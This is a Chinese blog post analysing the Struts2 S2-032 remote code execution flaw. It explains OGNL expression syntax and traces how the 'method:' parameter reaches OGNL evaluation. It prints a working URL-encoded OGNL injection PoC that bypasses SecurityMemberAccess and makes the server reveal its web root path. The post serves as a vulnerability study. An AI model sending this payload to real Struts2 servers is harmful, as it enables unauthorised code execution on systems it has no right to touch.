@@ -1,0 +1,110 @@
+---
+layout:     post
+title:      "Struts2 远程代码执行漏洞分析"
+subtitle:   "S2-032"
+data:       2016-04-29
+author:     "dogewatch"
+header-img: "img/home-bg-o.jpg"
+tags:
+    - web
+---
+
+> "gg"
+
+## 前言
+
+前天一大早起来在地铁上看到TK教主的微博里说Struts2又有漏洞了，去了测评后打开wooyun瞬间被各种命令执行刷屏了。本来想着要不要扫些网站刷点rank，然后又觉得这么做没任何意义，毕竟不想当一个工具小子或者是脚本小子。因为以前都没有分析过Struts2的漏洞，所以就想乘此机会搭个环境调一调这个漏洞具体是怎么回事的。
+足足搞了一天，才搭了一个有S2-032漏洞的网站（在此表示对javaweb深恶痛绝）。不过在分析这个漏洞以前，需要先了解了解这一系列Struts2漏洞的罪魁祸首：OGNL表达式。
+
+## OGNL
+
+参考<a href="http://drops.wooyun.org/papers/340">这篇文章</a>（大部分引用原文），来聊一下这个OGNL表达式是个什么鬼。
+
+
+OGNL是Object-Graph Navigation Language的缩写，它是一种功能强大的表达式语言（Expression Language，简称为EL），通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。 OGNL三要素：
+
+1. 表达式（Expression）
+
+表达式是整个OGNL的核心，所有的OGNL操作都是针对表达式的解析后进行的。表达式会规定此次OGNL操作到底要干什么。我们可以看到，在上面的测试中，name、department.name等都是表达式，表示取name或者department中的name的值。OGNL支持很多类型的表达式，之后我们会看到更多。
+
+2. 根对象（Root Object）
+
+根对象可以理解为OGNL的操作对象。在表达式规定了“干什么”以后，你还需要指定到底“对谁干”。在上面的测试代码中，user就是根对象。这就意味着，我们需要对user这个对象去取name这个属性的值（对user这个对象去设置其中的department中的name属性值）。
+
+3. 上下文环境（Context）
+
+有了表达式和根对象，我们实际上已经可以使用OGNL的基本功能。例如，根据表达式对根对象进行取值或者设值工作。不过实际上，在OGNL的内部，所有的操作都会在一个特定的环境中运行，这个环境就是OGNL的上下文环境（Context）。说得再明白一些，就是这个上下文环境（Context），将规定OGNL的操作“在哪里干”。 OGN L的上下文环境是一个Map结构，称之为OgnlContext。上面我们提到的根对象（Root Object），事实上也会被加入到上下文环境中去，并且这将作为一个特殊的变量进行处理，具体就表现为针对根对象（Root Object）的存取操作的表达式是不需要增加#符号进行区分的。
+
+OGNL表达式功能操作大体如下：
+
+```
+
+1. 基本对象树的访问
+对象树的访问就是通过使用点号将对象的引用串联起来进行。
+例如：xxxx，xxxx.xxxx，xxxx. xxxx. xxxx. xxxx. xxxx
+
+2. 对容器变量的访问
+对容器变量的访问，通过#符号加上表达式进行。
+例如：#xxxx，#xxxx. xxxx，#xxxx.xxxxx. xxxx. xxxx. xxxx
+
+3. 使用操作符号
+OGNL表达式中能使用的操作符基本跟Java里的操作符一样，除了能使用 +, -, *, /, ++, --, ==, !=, = 等操作符之外，还能使用 mod, in, not in等。
+
+4. 容器、数组、对象
+OGNL支持对数组和ArrayList等容器的顺序访问：例如：group.users[0]
+同时，OGNL支持对Map的按键值查找：
+例如：#session['mySessionPropKey']
+不仅如此，OGNL还支持容器的构造的表达式：
+例如：{"green", "red", "blue"}构造一个List，#{"key1" : "value1", "key2" : "value2", "key3" : "value3"}构造一个Map
+你也可以通过任意类对象的构造函数进行对象新建：
+例如：new Java.net.URL("xxxxxx/")
+
+5. 对静态方法或变量的访问
+要引用类的静态方法和字段，他们的表达方式是一样的@class@member或者@class@method(args)：
+例如：@com.javaeye.core.Resource@ENABLE，@com.javaeye.core.Resource@getAllResources
+
+6. 方法调用
+直接通过类似Java的方法调用方式进行，你甚至可以传递参数：
+例如：user.getName()，group.users.size()，group.containsUser(#requestUser)
+
+7. 投影和选择
+OGNL支持类似数据库中的投影（projection） 和选择（selection）。
+投影就是选出集合中每个元素的相同属性组成新的集合，类似于关系数据库的字段操作。投影操作语法为 collection.{XXX}，其中XXX 是这个集合中每个元素的公共属性。
+例如：group.userList.{username}将获得某个group中的所有user的name的列表。
+选择就是过滤满足selection 条件的集合元素，类似于关系数据库的纪录操作。选择操作的语法为：collection.{X YYY}，其中X 是一个选择操作符，后面则是选择用的逻辑表达式。而选择操作符有三种：
+? 选择满足条件的所有元素
+^ 选择满足条件的第一个元素
+$ 选择满足条件的最后一个元素
+例如：group.userList.{? #txxx.xxx != null}将获得某个group中user的name不为空的user的列表。
+
+```
+
+由此可以看出，只要外部某些参数能够进入OGNL流程，那么理论上就可以执行恶意代码。而不幸的是，Struts2大量地使用了OGNL，从而导致其命令执行漏洞层出不穷。
+
+## S2-032
+
+这次爆出的漏洞其根本原因是在开启了动态方法调用以后，action?method：后的内容进入到了OGNL流程，导致了远程命令执行。
+
+先上烂大街的POC：
+
+```
+method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23parameters.web[0]),%23w.print(%23parameters.path[0]),%23w.print(%23path),1?%23xx:%23request.toString&pp=%2f&encoding=UTF-8&web=web&path=path%3a
+```
+
+poc经过的几个关键函数大体如下：
+
+1.在DefaultActionMapper.java中，DefaultActionMapper方法将method的值存入到ActionMapping的method属性中。
+![img](/img/post/s2-1.png)
+
+2.在DefaultActionProxyFactory.java中，DefaultActionProxy方法将ActionMapping的method值经过escapeEcmaScript，escapeHtml4过滤后传到了ActionProxy的method属性中。
+![img](/img/post/s2-3.png)
+
+3.最后DefaultActionInvocation.java中的invokeAction将ActionProxy的method值放入到了ognlUtil.getValue()方法中执行表达式。
+![img](/img/post/s2-5.png)
+（吐槽下IEDA的debug功能，跟了好多遍才跟进这个方法）method值后面被加上的()也很容易被绕过。
+
+将_memberAccess赋值成DEFAULT_MEMBER_ACCESS后就能绕过SecurityMemberAccess为false的限制。
+
+## 后记
+
+感觉分析S2的漏洞还是挺简单的，不过想想里面的流程就觉得要是挖出这样一个CVE目前还是差得有点远。今天比赛没进前十，心塞塞>_<
